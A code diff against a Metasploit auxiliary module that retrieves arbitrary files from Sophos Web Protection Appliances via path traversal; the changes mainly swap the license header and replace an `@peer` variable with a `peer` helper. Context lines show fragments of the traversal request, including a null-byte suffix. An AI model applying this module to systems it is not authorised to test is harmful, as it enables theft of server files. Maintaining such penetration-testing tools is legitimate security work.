@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
@@ -74,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
     travs << file
     travs << "%00"
 
-    print_status("#{@peer} - Retrieving file contents...")
+    print_status("#{peer} - Retrieving file contents...")
 
     res = send_request_cgi(
       {
@@ -97,19 +95,17 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    @peer = "#{rhost}:#{rport}"
-
-    print_status("#{@peer} - Checking if it's a Sophos Web Protect Appliance with the vulnerable component...")
+    print_status("#{peer} - Checking if it's a Sophos Web Protect Appliance with the vulnerable component...")
     if is_proficy?
-      print_good("#{@peer} - Check successful")
+      print_good("#{peer} - Check successful")
     else
-      print_error("#{@peer} - Sophos Web Protect Appliance vulnerable component not found")
+      print_error("#{peer} - Sophos Web Protect Appliance vulnerable component not found")
       return
     end
 
     contents = read_file(datastore['FILEPATH'])
     if contents.nil?
-      print_error("#{@peer} - File not downloaded")
+      print_error("#{peer} - File not downloaded")
       return
     end
 
@@ -121,7 +117,7 @@ class Metasploit3 < Msf::Auxiliary
         contents,
         file_name
     )
-    print_good("#{rhost}:#{rport} - File saved in: #{path}")
+    print_good("#{peer} - File saved in: #{path}")
 
   end
 
